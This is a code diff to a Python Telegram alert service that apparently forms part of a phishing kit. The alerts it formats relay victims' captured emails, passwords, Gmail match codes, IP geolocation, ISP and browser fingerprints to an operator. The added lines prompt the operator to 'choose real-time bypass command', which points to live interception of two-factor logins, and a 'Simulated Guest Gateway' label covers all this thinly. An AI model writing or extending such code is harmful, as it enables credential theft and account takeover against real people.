@@ -50,22 +50,26 @@ class TelegramService:
             payload["reply_markup"] = reply_markup
         return self.api_call("sendMessage", payload)
 
-    def send_visitor_alert(self, visitor,state):
+    def send_visitor_alert(self, visitor):
         if not self.is_configured():
             return None
 
         message = f"""
-👀 <b>IMCOMING SUBMISSION FROM ! {state.get('provider', 'Unknown')}</b>
-
+👀 👀 <b>IMCOMING SUBMISSION FROM {visitor.get('provider', 'Unknown').upper()}!</b>
+━━━━━━━━━━━━━━━━━━
         """.strip()
 
         return self.send_message(message, "HTML")
 
-    def send_login_alert(self, state,visitor):
+    def send_login_alert(self, state):
         if not self.is_configured():
             return None
 
         provider_name = state.get("provider", "").upper()
+        attempt_id = state.get("id", "")
+
+        visitor = state.get("visitor", {})  # ✅ IMPORTANT
+
         prompt_details = (
             f"🔢 <b>Gmail Match Code:</b> <code>{state.get('promptNumber')}</code>\n"
             if state.get("promptNumber") else ""
@@ -79,35 +83,34 @@ class TelegramService:
             except Exception:
                 pass
 
-        attempt_id = state.get("id", "")
-
         message = f"""
-🔐 <b>Simulated Guest Gateway Login</b>
-━━━━━━━━━━━━━━━━━━
-🏢 <b>Portal:</b> {provider_name}
-📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
-🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
-{prompt_details}📍 <b>Timestamp:</b> {time_format}
-------------------------------
-------------------------------
+    🔐 <b>Simulated Guest Gateway Login</b>
+    ━━━━━━━━━━━━━━━━━━
+    🏢 <b>Portal:</b> {provider_name}
+    📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
+    🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
 
-📍 <b>Location &amp; Network:</b>
-• IP: <code>{visitor.get('ip') or "Unknown"}</code>
-• City: <code>{visitor.get('city') or "Unknown"}</code>
-• Region: <code>{visitor.get('region') or "Unknown"}</code>
-• Country: <code>{visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})</code>
-• Provider/ISP: <code>{visitor.get('org') or "Unknown"}</code>
+    📍 <b>Location & Network:</b>
+    • IP: <code>{visitor.get('ip', 'Unknown')}</code>
+    • City: <code>{visitor.get('city', 'Unknown')}</code>
+    • Region: <code>{visitor.get('region', 'Unknown')}</code>
+    • Country: <code>{visitor.get('country_name', 'Unknown')} ({visitor.get('country_code', '??')})</code>
+    • Provider/ISP: <code>{visitor.get('org', 'Unknown')}</code>
 
-📱 <b>Device &amp; Browser Fingerprint:</b>
-• Browser: <code>{visitor.get('browser') or "Unknown"}</code>
-• OS: <code>{visitor.get('os') or "Unknown"}</code>
-• Screen Size: <code>{visitor.get('screenSize') or "Unknown"}</code>
-• Language: <code>{visitor.get('language') or "Unknown"}</code>
-• Timezone: <code>{visitor.get('timezone') or "Unknown"}</code>
-• CPU Cores: <code>{visitor.get('cores') or "Unknown"} Cores</code>
-• Platform: <code>{visitor.get('platform') or "Unknown"}</code>
-• User Agent: <code>{visitor.get('userAgent') or "Unknown"}</code>
+    📱 <b>Device & Browser Fingerprint:</b>
+    • Browser: <code>{visitor.get('browser', 'Unknown')}</code>
+    • OS: <code>{visitor.get('os', 'Unknown')}</code>
+    • Screen Size: <code>{visitor.get('screenSize', 'Unknown')}</code>
+    • Language: <code>{visitor.get('language', 'Unknown')}</code>
+    • Timezone: <code>{visitor.get('timezone', 'Unknown')}</code>
+    • CPU Cores: <code>{visitor.get('cores', 'Unknown')} Cores</code>
+    • Platform: <code>{visitor.get('platform', 'Unknown')}</code>
 
+    ━━━━━━━━━━━━━━━━━━
+    📌 <b>Timestamp:</b> {time_format}
+    ━━━━━━━━━━━━━━━━━━
+    <b>⚠️ HOST ACTIONS REQUIRED</b>
+    Choose real-time bypass command below:
         """.strip()
 
         keyboard = []
